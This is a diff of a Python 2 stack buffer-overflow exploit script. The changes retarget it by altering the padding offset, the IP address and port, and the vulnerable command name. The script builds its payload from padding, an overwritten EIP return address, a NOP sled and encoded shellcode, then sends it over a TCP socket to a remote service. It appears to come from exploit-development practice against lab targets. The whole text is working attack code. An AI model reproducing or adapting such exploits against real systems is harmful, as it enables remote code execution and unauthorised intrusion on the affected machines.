@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 import socket,sys,time,struct
 
-buf = 'A'*1493
+buf = 'A'*1111
 eip=struct.pack("<I",0x56526683)
 nops="\x90"*16
 shell=("\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
@@ -32,8 +32,8 @@ shell=("\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
 esp='C'*(3000-4-len(buf)-len(nops)-len(shell))
 buffer=buf+eip+nops+shell+esp
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("192.168.30.110",4455))
-buffer=("OVRFLW "+buffer+"\r\n")
+s.connect(("10.1.1.5",2244))
+buffer=("OVERFLOW "+buffer+"\r\n")
 s.send(buffer)
 print "[+] sending exploit shell"
 s.close()
